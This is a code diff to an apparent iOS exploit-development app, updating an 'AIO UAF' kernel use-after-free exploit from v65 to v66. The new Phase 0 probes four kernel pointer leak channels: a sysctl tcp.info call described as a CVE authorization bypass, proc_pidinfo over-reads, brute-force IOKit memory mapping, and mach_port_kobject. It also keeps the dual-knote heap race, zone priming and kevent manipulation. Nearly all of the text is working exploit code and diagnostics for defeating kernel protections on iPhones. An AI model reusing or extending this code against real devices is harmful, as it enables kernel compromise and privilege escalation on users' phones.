@@ -247,12 +247,11 @@ struct aio_race_state {
     ssize_t return_result;  // v47: aio_return result or aio_read errno (diagnostics)
 };
 
-// v65: v64 + FastPath Phase 0 kernel pointer probe. v64 proved dual-knote
-// doesn't crash — Phase B TAILQ_REMOVE on doneq entry is safe. v65 adds a
-// pre-exploit FastPath probe: open IOHIDFamily user client, map event buffer,
-// scan for kernel pointers. Decouples read (FastPath IOConnectMapMemory64 scan)
-// from write (AIO UAF TAILQ_REMOVE), avoiding the ext[] offset mismatch dead end.
-// Phase 0 = FastPath probe, Phase A/B = dual-knote, Phase C = health check.
+// v66: v65 + multi-vector Phase 0 kernel pointer probe. v65's FastPath-only
+// probe hit exclusive-access (0xe00002c5) on iOS 26.2. v66 expands to four
+// independent leak channels: (A) sysctl tcp.info, (B) proc_pidinfo,
+// (C) non-FastPath IOKit enumeration, (D) mach_port_kobject. Each probe
+// dumps its full return buffer and scans for 0xFFFFFE/0xFFFFFF patterns.
 // Key design:
 //   1. 7x zone priming, lio_listio batch reclaim (from v63)
 //   2. rcbs[0] SIGEV_KEVENT on kq2 — creates second knote to same slot S
@@ -582,7 +581,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *aioConf = [UIButtonConfiguration filledButtonConfiguration];
     aioConf.baseBackgroundColor = [UIColor systemOrangeColor];
     self.aioUafButton.configuration = aioConf;
-    [self.aioUafButton setTitle:@"AIO UAF v65" forState:UIControlStateNormal];
+    [self.aioUafButton setTitle:@"AIO UAF v66" forState:UIControlStateNormal];
     [self.aioUafButton addTarget:self action:@selector(aioUafTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.aioUafButton];
 
@@ -5948,183 +5947,351 @@ static void *e2_free_and_ool_racer(void *arg) {
 // Confirms ext[1] control via reclaim aio_nbytes (distinct marker).
 // Leaks kernel heap address via kevent64 ident field.
 
-#pragma mark - Phase 0: FastPath Kernel Pointer Probe
+#pragma mark - Phase 0: Multi-Vector Kernel Pointer Probe
 
-// v65 Phase 0: Use IOHIDFamily FastPathUserClient to map an event buffer
-// and scan for kernel pointers. This provides an independent "read channel"
-// decoupled from the AIO ext[] offset mismatch dead end.
-- (NSDictionary *)runFastPathKernelPointerProbe {
-    NSMutableDictionary *result = [NSMutableDictionary dictionary];
-    result[@"success"] = @NO;
-    result[@"kernelPointers"] = @[];
+// v66 Phase 0: Multi-vector probe for kernel pointer leaks.
+// Tests four independent channels; each is non-destructive and
+// failure in one does not block the others.
 
+// Stricter kernel pointer validation for A15/iOS 26.2:
+// Real kernel pointers are in 0xFFFFFE00... or 0xFFFFFF80... ranges.
+// Values with hi32 == 0xFFFFFFFF are usually sentinels/canaries, not real pointers.
+// Values with low 32 bits < 0x1000 are too small for a real heap offset.
+- (BOOL)isRealKernelPointer:(uint64_t)value {
+    if (value == 0) return NO;
+    uint32_t hi32 = (uint32_t)(value >> 32);
+    uint32_t lo32 = (uint32_t)(value & 0xFFFFFFFF);
+
+    // Must be in kernel address range
+    if (value < 0xFFFFFE0000000000ULL) return NO;
+
+    // Reject sentinel/canary patterns (0xFFFFFFFF high word + tiny payload)
+    if (hi32 == 0xFFFFFFFF && lo32 < 0x1000) return NO;
+
+    // Accept: 0xFFFFFE00, 0xFFFFFF80, 0xFFFFFF00
+    if (hi32 == 0xFFFFFE00 || hi32 == 0xFFFFFF80 || hi32 == 0xFFFFFF00) return YES;
+
+    // Accept other values in the broad kernel range if they look like heap addresses
+    if (lo32 >= 0x1000 && lo32 < 0xF0000000) return YES;
+
+    return NO;
+}
+
+// Dump a buffer as hex, scanning for kernel pointer candidates.
+// Returns array of @{@"offset": NSNumber, @"value": NSString} dicts.
+- (NSArray<NSDictionary *> *)scanBufferForKernelPointers:(const uint8_t *)buf
+                                                  length:(size_t)len
+                                                   label:(NSString *)label {
+    NSMutableArray *hits = [NSMutableArray array];
+    if (!buf || len < 8) return hits;
+
+    for (size_t off = 0; off + 8 <= len; off += 4) {
+        uint64_t val = 0;
+        memcpy(&val, buf + off, sizeof(val));
+        if ([self isRealKernelPointer:val]) {
+            [hits addObject:@{
+                @"offset": @(off),
+                @"value": [NSString stringWithFormat:@"0x%016llx", val]
+            }];
+        }
+    }
+
+    if (hits.count > 0) {
+        [self appendLog:[NSString stringWithFormat:@"Phase0 %@: %lu kernel ptr candidates", label, (unsigned long)hits.count]];
+        NSUInteger show = MIN(hits.count, 8);
+        for (NSUInteger i = 0; i < show; i++) {
+            NSDictionary *h = hits[i];
+            // Show 32 bytes of context around the hit
+            int64_t ctxOff = (int64_t)[h[@"offset"] integerValue] - 16;
+            if (ctxOff < 0) ctxOff = 0;
+            size_t ctxLen = (size_t)(len - (size_t)ctxOff);
+            if (ctxLen > 32) ctxLen = 32;
+            [self appendLog:[NSString stringWithFormat:@"  [%lu] off=%lu val=%@ ctx=%@",
+                (unsigned long)i, (unsigned long)[h[@"offset"] integerValue], h[@"value"],
+                [self hexPreview:(buf + ctxOff) length:ctxLen]]];
+        }
+    }
+    return hits;
+}
+
+// Sub-test A: sysctl net.inet.tcp.info — CVE-2026-28867 auth bypass
+- (void)subtestSysctlTcpInfo {
+    [self appendLog:@"Phase0.A sysctl: creating TCP connection..."];
+
+    int listenFd = socket(AF_INET, SOCK_STREAM, 0);
+    if (listenFd < 0) {
+        [self appendLog:@"Phase0.A sysctl: socket() failed"];
+        return;
+    }
+
+    struct sockaddr_in addr = {};
+    addr.sin_family = AF_INET;
+    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+    addr.sin_len = sizeof(addr);
+
+    if (bind(listenFd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
+        [self appendLog:[NSString stringWithFormat:@"Phase0.A sysctl: bind() failed: %s", strerror(errno)]];
+        close(listenFd);
+        return;
+    }
+
+    if (listen(listenFd, 1) < 0) {
+        [self appendLog:[NSString stringWithFormat:@"Phase0.A sysctl: listen() failed: %s", strerror(errno)]];
+        close(listenFd);
+        return;
+    }
+
+    socklen_t addrLen = sizeof(addr);
+    if (getsockname(listenFd, (struct sockaddr *)&addr, &addrLen) < 0) {
+        [self appendLog:[NSString stringWithFormat:@"Phase0.A sysctl: getsockname() failed: %s", strerror(errno)]];
+        close(listenFd);
+        return;
+    }
+
+    int connFd = socket(AF_INET, SOCK_STREAM, 0);
+    if (connFd < 0) {
+        close(listenFd);
+        return;
+    }
+
+    if (connect(connFd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
+        [self appendLog:[NSString stringWithFormat:@"Phase0.A sysctl: connect() failed: %s", strerror(errno)]];
+        close(connFd); close(listenFd);
+        return;
+    }
+
+    int accepted = accept(listenFd, NULL, NULL);
+    if (accepted < 0) {
+        close(connFd); close(listenFd);
+        return;
+    }
+
+    // Build info_tuple for our connection
+    struct {
+        uint8_t  proto;
+        uint8_t  padding[3];
+        struct sockaddr_in local;
+        struct sockaddr_in remote;
+    } tuple = {};
+    tuple.proto = IPPROTO_TCP;
+
+    socklen_t localLen = sizeof(tuple.local);
+    socklen_t remoteLen = sizeof(tuple.remote);
+    getsockname(accepted, (struct sockaddr *)&tuple.local, &localLen);
+    getpeername(accepted, (struct sockaddr *)&tuple.remote, &remoteLen);
+
+    [self appendLog:[NSString stringWithFormat:@"Phase0.A sysctl: local=%d remote=%d",
+        ntohs(tuple.local.sin_port), ntohs(tuple.remote.sin_port)]];
+
+    // Query tcp.info (CVE-2026-28867: no permission check on the socket)
+    size_t infoLen = 0;
+    int ret = sysctlbyname("net.inet.tcp.info", NULL, &infoLen, &tuple, sizeof(tuple));
+    if (ret != 0 || infoLen == 0) {
+        // ENOMEM is expected on the first call (buffer too small)
+        if (errno != ENOMEM || infoLen == 0) {
+            [self appendLog:[NSString stringWithFormat:@"Phase0.A sysctl: size query failed ret=%d errno=%d", ret, errno]];
+            close(connFd); close(accepted); close(listenFd);
+            return;
+        }
+    }
+
+    [self appendLog:[NSString stringWithFormat:@"Phase0.A sysctl: infoLen=%zu", infoLen]];
+
+    // Allocate and fetch
+    uint8_t *buf = (uint8_t *)calloc(1, infoLen + 64); // extra in case of variance
+    if (!buf) {
+        close(connFd); close(accepted); close(listenFd);
+        return;
+    }
+    if (sysctlbyname("net.inet.tcp.info", buf, &infoLen, &tuple, sizeof(tuple)) == 0) {
+        [self appendLog:[NSString stringWithFormat:@"Phase0.A sysctl: fetched %zu bytes", infoLen]];
+        // Hex dump first 256 bytes (or full buffer if smaller)
+        size_t dumpLen = MIN(infoLen, (size_t)256);
+        [self appendLog:[NSString stringWithFormat:@"Phase0.A buffer[0..%zu]: %@",
+            dumpLen - 1, [self hexPreview:buf length:dumpLen]]];
+        [self scanBufferForKernelPointers:buf length:infoLen label:@"sysctl.tcp"];
+    } else {
+        [self appendLog:[NSString stringWithFormat:@"Phase0.A sysctl: fetch failed: %s", strerror(errno)]];
+    }
+    free(buf);
+    close(connFd); close(accepted); close(listenFd);
+}
+
+// Sub-test B: proc_pidinfo — dump task/bsd info structs
+- (void)subtestProcPidinfo {
+    [self appendLog:@"Phase0.B proc_pidinfo: querying self..."];
+
+    int pid = getpid();
+
+    // PROC_PIDTASKINFO = 4, returns proc_taskinfo (~232+ bytes)
+    // PROC_PIDTBSDINFO  = 3, returns proc_bsdinfo (~72+ bytes)
+    // PROC_PIDTASKALLINFO = 16, returns proc_taskallinfo (larger)
+
+    int flavors[] = {4, 3, 16}; // PROC_PIDTASKINFO, PROC_PIDTBSDINFO, PROC_PIDTASKALLINFO
+    const char *names[] = {"TASKINFO", "BSDINFO", "TASKALLINFO"};
+
+    for (int i = 0; i < 3; i++) {
+        // Large buffer: 2048 bytes to catch any over-read
+        size_t bufSize = 2048;
+        uint8_t *buf = (uint8_t *)calloc(1, bufSize);
+        if (!buf) continue;
+
+        int ret = proc_pidinfo(pid, flavors[i], 0, buf, (uint32_t)bufSize);
+        if (ret > 0) {
+            [self appendLog:[NSString stringWithFormat:@"Phase0.B %s: ret=%d bytes", names[i], ret]];
+            size_t scanSize = (size_t)ret;
+            // Scan beyond the declared size too — look for uninitialized kernel memory
+            size_t extraScan = MIN(bufSize, (size_t)ret + 256);
+            [self appendLog:[NSString stringWithFormat:@"Phase0.B %s[0..%zu]: %@",
+                names[i], MIN(scanSize, (size_t)128) - 1,
+                [self hexPreview:buf length:MIN(scanSize, (size_t)128)]]];
+            [self scanBufferForKernelPointers:buf length:extraScan label:[NSString stringWithFormat:@"pidinfo.%s", names[i]]];
+        } else {
+            [self appendLog:[NSString stringWithFormat:@"Phase0.B %s: failed (ret=%d errno=%d)", names[i], ret, errno]];
+        }
+        free(buf);
+    }
+}
+
+// Sub-test C: Non-FastPath IOKit service enumeration + memory mapping
+- (void)subtestIOKitEnumeration {
     if (![self loadIOKitSymbols]) {
-        [self appendLog:@"Phase0 FastPath: IOKit symbols unavailable"];
-        return result;
+        [self appendLog:@"Phase0.C IOKit: symbols unavailable"];
+        return;
     }
-
     if (!sIOConnectMapMemory64) {
-        [self appendLog:@"Phase0 FastPath: IOConnectMapMemory64 unavailable"];
-        return result;
+        [self appendLog:@"Phase0.C IOKit: IOConnectMapMemory64 unavailable"];
+        return;
     }
 
-    [self appendLog:@"Phase0 FastPath: searching IOHIDEventService..."];
+    [self appendLog:@"Phase0.C IOKit: enumerating services..."];
 
-    CFMutableDictionaryRef matching = sIOServiceMatching("IOHIDEventService");
-    if (!matching) {
-        [self appendLog:@"Phase0 FastPath: IOServiceMatching failed"];
-        return result;
-    }
+    // Try a set of IOKit service names that might support memory mapping
+    const char *services[] = {
+        "IOSurfaceRoot",
+        "IOHIDEventService",
+        "AppleJPEGDriver",
+        "IOGPU",
+        "IOGraphicsAccelerator2",
+        "IONetworkingFamily",
+        "IOAudioControl",
+        "IOSerialBSDClient",
+        NULL
+    };
 
-    io_iterator_t iter = MACH_PORT_NULL;
-    if (sIOServiceGetMatchingServices(MACH_PORT_NULL, matching, &iter) != KERN_SUCCESS || iter == MACH_PORT_NULL) {
-        [self appendLog:@"Phase0 FastPath: no matching services"];
-        return result;
-    }
+    int tested = 0;
+    for (int s = 0; services[s]; s++) {
+        CFMutableDictionaryRef match = sIOServiceMatching(services[s]);
+        if (!match) continue;
 
-    io_service_t service = sIOIteratorNext(iter);
-    sIOObjectRelease(iter);
-    if (service == MACH_PORT_NULL) {
-        [self appendLog:@"Phase0 FastPath: no IOHIDEventService found"];
-        return result;
-    }
+        io_iterator_t iter = MACH_PORT_NULL;
+        if (sIOServiceGetMatchingServices(MACH_PORT_NULL, match, &iter) != KERN_SUCCESS) continue;
 
-    io_connect_t conn = MACH_PORT_NULL;
-    kern_return_t openKr = sIOServiceOpen(service, mach_task_self_, 2, &conn);
-    sIOObjectRelease(service);
+        io_service_t svc = MACH_PORT_NULL;
+        int svcCount = 0;
+        while ((svc = sIOIteratorNext(iter)) != MACH_PORT_NULL && svcCount < 3) {
+            svcCount++; tested++;
 
-    if (openKr != KERN_SUCCESS || conn == MACH_PORT_NULL) {
-        [self appendLog:[NSString stringWithFormat:@"Phase0 FastPath: IOServiceOpen failed 0x%x", openKr]];
-        return result;
-    }
+            // Try open types 0, 1, 2
+            for (int openType = 0; openType <= 2; openType++) {
+                io_connect_t conn = MACH_PORT_NULL;
+                kern_return_t openKr = sIOServiceOpen(svc, mach_task_self_, openType, &conn);
+                if (openKr != KERN_SUCCESS || conn == MACH_PORT_NULL) continue;
 
-    // Authorization bypass — same XML that works for Trigger UAF
-    kern_return_t gateKr = [self fastPathOpen:conn propertiesXML:kOpenPropertiesXML];
-    [self appendLog:[NSString stringWithFormat:@"Phase0 FastPath: open(selector0)=0x%x (%s)",
-                     gateKr, mach_error_string(gateKr)]];
-
-    if (gateKr != KERN_SUCCESS) {
-        [self appendLog:@"Phase0 FastPath: authorization bypass failed — FastPath patched on this iOS version?"];
-        sIOServiceClose(conn);
-        return result;
-    }
-
-    // Map the event buffer
-    mach_vm_address_t mapAddr = 0;
-    mach_vm_size_t mapSize = 0;
-    kern_return_t mapKr = sIOConnectMapMemory64(conn, kMemoryTypeEventBuffer,
-                                                  mach_task_self(), &mapAddr, &mapSize, 1);
-    [self appendLog:[NSString stringWithFormat:@"Phase0 FastPath: map(type=0)=0x%x addr=0x%llx size=%llu",
-                     mapKr, mapAddr, mapSize]];
-
-    if (mapKr != KERN_SUCCESS || mapAddr == 0 || mapSize == 0) {
-        [self appendLog:@"Phase0 FastPath: map failed"];
-        sIOServiceClose(conn);
-        return result;
-    }
-
-    // Trigger copyEvent to push kernel data through the buffer
-    int copySuccesses = 0;
-    int totalKernelPtrs = 0;
-    NSMutableArray *allPointers = [NSMutableArray array];
-
-    for (int round = 0; round < 20; round++) {
-        uint64_t scalarsIn[2] = { 0, 1 };
-        uint8_t structOut[256];
-        size_t structOutSize = sizeof(structOut);
-        kern_return_t copyKr = sIOConnectCallMethod(conn, kSelectorCopyEvent,
-            scalarsIn, 2, NULL, 0, NULL, NULL, structOut, &structOutSize);
-        if (copyKr == KERN_SUCCESS) copySuccesses++;
-
-        // Scan mapped buffer after each copyEvent
-        const uint8_t *base = (const uint8_t *)(uintptr_t)mapAddr;
-        size_t scanLen = MIN((size_t)mapSize, (size_t)kMappedProbeMax);
-
-        NSArray<NSDictionary *> *ptrs = [self scanForKernelPointers:base
-                                                              length:scanLen
-                                                          maxResults:20
-                                                           connIndex:0];
-        if (ptrs.count > 0) {
-            totalKernelPtrs += (int)ptrs.count;
-            [allPointers addObjectsFromArray:ptrs];
+                // Try map memory types 0..3
+                for (uint32_t memType = 0; memType <= 3; memType++) {
+                    mach_vm_address_t mapAddr = 0;
+                    mach_vm_size_t mapSize = 0;
+                    kern_return_t mapKr = sIOConnectMapMemory64(conn, memType, mach_task_self(), &mapAddr, &mapSize, 1);
+                    if (mapKr == KERN_SUCCESS && mapAddr != 0 && mapSize > 0 && mapSize < (1024 * 1024)) {
+                        size_t scanLen = MIN((size_t)mapSize, (size_t)4096);
+                        const uint8_t *scanBase = (const uint8_t *)(uintptr_t)mapAddr;
+                        NSArray *hits = [self scanBufferForKernelPointers:scanBase length:scanLen
+                            label:[NSString stringWithFormat:@"IOKit.%s(t=%d,m=%u)", services[s], openType, memType]];
+                        if (hits.count > 0) {
+                            [self appendLog:[NSString stringWithFormat:@"Phase0.C *** HIT: %s openType=%d memType=%u addr=0x%llx size=%llu ***",
+                                services[s], openType, memType, mapAddr, mapSize]];
+                        }
+                        // Unmap
+                        if (sIOConnectUnmapMemory64) {
+                            sIOConnectUnmapMemory64(conn, memType, mach_task_self(), mapAddr);
+                        } else {
+                            vm_deallocate(mach_task_self(), (vm_address_t)mapAddr, (vm_size_t)mapSize);
+                        }
+                    }
+                }
+                sIOServiceClose(conn);
+            }
+            sIOObjectRelease(svc);
         }
+        sIOObjectRelease(iter);
+    }
+    [self appendLog:[NSString stringWithFormat:@"Phase0.C IOKit: tested %d service instances", tested]];
+}
 
-        // Also scan struct output
-        NSArray<NSDictionary *> *structPtrs = [self scanForKernelPointers:structOut
-                                                                    length:structOutSize
-                                                                maxResults:10
-                                                                 connIndex:-1];
-        if (structPtrs.count > 0) {
-            [allPointers addObjectsFromArray:structPtrs];
+// Sub-test D: mach_port_kobject — try to get kernel object address from port
+- (void)subtestMachPortKobject {
+    [self appendLog:@"Phase0.D mach_port_kobject: probing..."];
+
+    // mach_port_kobject is in libsystem_kernel.dylib
+    typedef kern_return_t (*mach_port_kobject_fn)(mach_port_t, natural_t *, mach_vm_address_t *);
+    mach_port_kobject_fn f = (mach_port_kobject_fn)dlsym(RTLD_DEFAULT, "mach_port_kobject");
+    if (!f) {
+        [self appendLog:@"Phase0.D: mach_port_kobject not available"];
+        return;
+    }
+
+    // Try our own task port
+    mach_port_t ports[] = {
+        mach_task_self(),
+        mach_thread_self(),
+    };
+    const char *names[] = {"task", "thread"};
+
+    for (int i = 0; i < 2; i++) {
+        natural_t objType = 0;
+        mach_vm_address_t objAddr = 0;
+        kern_return_t kr = f(ports[i], &objType, &objAddr);
+        if (kr == KERN_SUCCESS && objAddr != 0) {
+            [self appendLog:[NSString stringWithFormat:@"Phase0.D %s: type=%d addr=0x%llx",
+                names[i], objType, objAddr]];
+            if ([self isRealKernelPointer:objAddr]) {
+                [self appendLog:[NSString stringWithFormat:@"Phase0.D *** HIT: %s kernel object at 0x%llx ***", names[i], objAddr]];
+            }
+        } else {
+            [self appendLog:[NSString stringWithFormat:@"Phase0.D %s: kr=0x%x (%s)", names[i], kr, mach_error_string(kr)]];
         }
-
-        usleep(1000); // 1ms between rounds
+        if (i == 1) mach_port_deallocate(mach_task_self(), ports[1]); // release thread port
     }
+}
 
-    [self appendLog:[NSString stringWithFormat:@"Phase0 FastPath: copyEvent=%d/20 ok, %d kernel ptrs in mapped buf, %lu total candidates",
-                     copySuccesses, totalKernelPtrs, (unsigned long)allPointers.count]];
+- (NSDictionary *)runPhase0MultiVectorProbe {
+    NSMutableDictionary *result = [NSMutableDictionary dictionary];
+    result[@"success"] = @YES;
 
-    // Deduplicate by value
-    NSMutableDictionary *uniqueByValue = [NSMutableDictionary dictionary];
-    for (NSDictionary *p in allPointers) {
-        NSString *val = p[@"value"];
-        if (val && !uniqueByValue[val]) {
-            uniqueByValue[val] = p;
-        }
-    }
+    [self appendLog:@"\n=== Phase 0 v66: Multi-Vector Kernel Pointer Probe ==="];
 
-    // Log unique kernel pointer candidates
-    NSArray *sortedKeys = [[uniqueByValue allKeys] sortedArrayUsingSelector:@selector(compare:)];
-    int shown = 0;
-    for (NSString *val in sortedKeys) {
-        if (shown >= 15) break;
-        NSDictionary *p = uniqueByValue[val];
-        [self appendLog:[NSString stringWithFormat:@"  kptr[%d]: %@ offset=%@ inArray=%@ ctx=%@",
-                         shown, val, p[@"offset"], p[@"inArray"], p[@"context"]]];
-        shown++;
-    }
-    if (sortedKeys.count > 15) {
-        [self appendLog:[NSString stringWithFormat:@"  ... and %lu more unique kernel pointer candidates",
-                         (unsigned long)(sortedKeys.count - 15)]];
-    }
+    // A: sysctl net.inet.tcp.info
+    [self appendLog:@"\n-- Phase0.A: sysctl net.inet.tcp.info --"];
+    @try { [self subtestSysctlTcpInfo]; }
+    @catch (NSException *e) { [self appendLog:[NSString stringWithFormat:@"Phase0.A exception: %@", e]]; }
 
-    // Store result
-    result[@"success"] = @(copySuccesses > 0);
-    result[@"kernelPointers"] = [uniqueByValue allKeys];
-    result[@"copyEventOk"] = @(copySuccesses);
-    result[@"mapSize"] = @(mapSize);
-    result[@"mapAddr"] = [NSString stringWithFormat:@"0x%llx", mapAddr];
+    // B: proc_pidinfo
+    [self appendLog:@"\n-- Phase0.B: proc_pidinfo --"];
+    @try { [self subtestProcPidinfo]; }
+    @catch (NSException *e) { [self appendLog:[NSString stringWithFormat:@"Phase0.B exception: %@", e]]; }
 
-    // If we found kernel pointers, save the first one for proof
-    if (sortedKeys.count > 0) {
-        NSString *firstVal = sortedKeys[0];
-        uint64_t leakValue = 0;
-        sscanf(firstVal.UTF8String, "0x%llx", &leakValue);
-        self.proofKernelPointerLeak = YES;
-        self.proofKernelPointerValue = leakValue;
-        self.proofKernelPointerHex = firstVal;
-        [self appendLog:[NSString stringWithFormat:@"Phase0 FastPath: stored proof ptr=%@", firstVal]];
+    // C: IOKit enumeration
+    [self appendLog:@"\n-- Phase0.C: IOKit enumeration --"];
+    @try { [self subtestIOKitEnumeration]; }
+    @catch (NSException *e) { [self appendLog:[NSString stringWithFormat:@"Phase0.C exception: %@", e]]; }
 
-        // Persist to file
-        NSString *docsDir = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
-        NSString *kpDir = [docsDir stringByAppendingPathComponent:@"sword"];
-        [[NSFileManager defaultManager] createDirectoryAtPath:kpDir withIntermediateDirectories:YES attributes:nil error:nil];
-        NSString *kpPath = [kpDir stringByAppendingPathComponent:@"kptr.txt"];
-        [[NSString stringWithFormat:@"%@ offset=%@\n", firstVal, uniqueByValue[firstVal][@"offset"]] writeToFile:kpPath atomically:YES];
-    }
+    // D: mach_port_kobject
+    [self appendLog:@"\n-- Phase0.D: mach_port_kobject --"];
+    @try { [self subtestMachPortKobject]; }
+    @catch (NSException *e) { [self appendLog:[NSString stringWithFormat:@"Phase0.D exception: %@", e]]; }
 
-    // Cleanup: close connection (unmap if possible)
-    BOOL unmapped = NO;
-    if (sIOConnectUnmapMemory64) {
-        kern_return_t unmapKr = sIOConnectUnmapMemory64(conn, kMemoryTypeEventBuffer, mach_task_self(), mapAddr);
-        unmapped = (unmapKr == KERN_SUCCESS);
-    }
-    if (!unmapped && mapAddr != 0) {
-        vm_deallocate(mach_task_self(), (vm_address_t)mapAddr, (vm_size_t)mapSize);
-    }
-    sIOServiceClose(conn);
-
-    [self appendLog:@"Phase0 FastPath: complete"];
+    [self appendLog:@"\n=== Phase 0 Complete ==="];
     return result;
 }
 
@@ -6148,11 +6315,11 @@ static void *e2_free_and_ool_racer(void *arg) {
         _aioLast = now;
     }
 
-    [self appendLog:@"\n========== AIO UAF v65 (FastPath Probe + Dual-Knote) =========="];
+    [self appendLog:@"\n========== AIO UAF v66 (Multi-Vector Phase 0 + Dual-Knote) =========="];
 
-    // ---- Phase 0 v65: FastPath kernel pointer probe ----
-    [self appendLog:@"\n--- Phase 0 v65: FastPath kernel pointer probe ---"];
-    NSDictionary *fpResult = [self runFastPathKernelPointerProbe];
+    // ---- Phase 0 v66: Multi-vector kernel pointer probe ----
+    [self appendLog:@"\n--- Phase 0 v66: Multi-vector kernel pointer probe ---"];
+    NSDictionary *fpResult = [self runPhase0MultiVectorProbe];
     [self appendLog:[NSString stringWithFormat:@"Phase0 result: success=%@ copyEventOk=%@ uniquePtrs=%lu",
                      fpResult[@"success"], fpResult[@"copyEventOk"],
                      (unsigned long)[fpResult[@"kernelPointers"] count]]];
@@ -6167,19 +6334,19 @@ static void *e2_free_and_ool_racer(void *arg) {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
         @autoreleasepool {
 
-    // v65: Diagnostic in Documents (persists across kernel panic / reboot)
+    // v66: Diagnostic in Documents (persists across kernel panic / reboot)
     NSString *docsDir = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
-    NSString *diagPath = [docsDir stringByAppendingPathComponent:@"diag_v65.txt"];
+    NSString *diagPath = [docsDir stringByAppendingPathComponent:@"diag_v66.txt"];
     unlink(diagPath.UTF8String);
 
-    // v65: SINGLE file — all AIO ops use same fd
-    NSString *aioPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"aio_v65.bin"];
+    // v66: SINGLE file — all AIO ops use same fd
+    NSString *aioPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"aio_v66.bin"];
     int fd = open(aioPath.UTF8String, O_CREAT | O_RDWR | O_TRUNC, 0644);
     if (fd < 0) {
         [self appendLog:@"FAIL: could not create file"];
         dispatch_async(dispatch_get_main_queue(), ^{
             self.aioUafButton.enabled = YES;
-            [self.aioUafButton setTitle:@"AIO UAF v65" forState:UIControlStateNormal];
+            [self.aioUafButton setTitle:@"AIO UAF v66" forState:UIControlStateNormal];
         });
         return;
     }
@@ -6193,8 +6360,8 @@ static void *e2_free_and_ool_racer(void *arg) {
     [self appendLog:[NSString stringWithFormat:@"diag=%@", diagPath]];
 
     uint64_t entryAddr = 0;
-    // ---- Phase A v65: Dual-knote — stale knote(kq) + fresh knote(kq2) ----
-    [self appendLog:@"\n--- Phase A v65: 7x prime → lio_listio trigger → racer → lio_listio batch reclaim → kevent64(kq) → kevent64(kq2) ---"];
+    // ---- Phase A v66: Dual-knote — stale knote(kq) + fresh knote(kq2) ----
+    [self appendLog:@"\n--- Phase A v66: 7x prime → lio_listio trigger → racer → lio_listio batch reclaim → kevent64(kq) → kevent64(kq2) ---"];
 
     bool phaseA_won = false;
     for (int attempt = 0; attempt < 10; attempt++) {
@@ -6290,8 +6457,8 @@ static void *e2_free_and_ool_racer(void *arg) {
 
     [self appendLog:[NSString stringWithFormat:@"\nWIN: entryAddr=0x%llx", entryAddr]];
 
-    // ---- Phase C v65: Health check ----
-    [self appendLog:@"\n--- Phase C v65: Health check ---"];
+    // ---- Phase C v66: Health check ----
+    [self appendLog:@"\n--- Phase C v66: Health check ---"];
     {
         struct aiocb hc[4];
         char hcbuf[4][256];
@@ -6317,11 +6484,11 @@ cleanup:
     close(fd);
     unlink(aioPath.UTF8String);
     [self appendLog:[NSString stringWithFormat:@"=== uid=%d gid=%d ===", getuid(), getgid()]];
-    [self appendLog:@"========== AIO UAF v65 Complete =========="];
+    [self appendLog:@"========== AIO UAF v66 Complete =========="];
             _aioRunning = 0;
             dispatch_async(dispatch_get_main_queue(), ^{
                 self.aioUafButton.enabled = YES;
-                [self.aioUafButton setTitle:@"AIO UAF v65" forState:UIControlStateNormal];
+                [self.aioUafButton setTitle:@"AIO UAF v66" forState:UIControlStateNormal];
             });
         }  // @autoreleasepool
     });  // dispatch_async
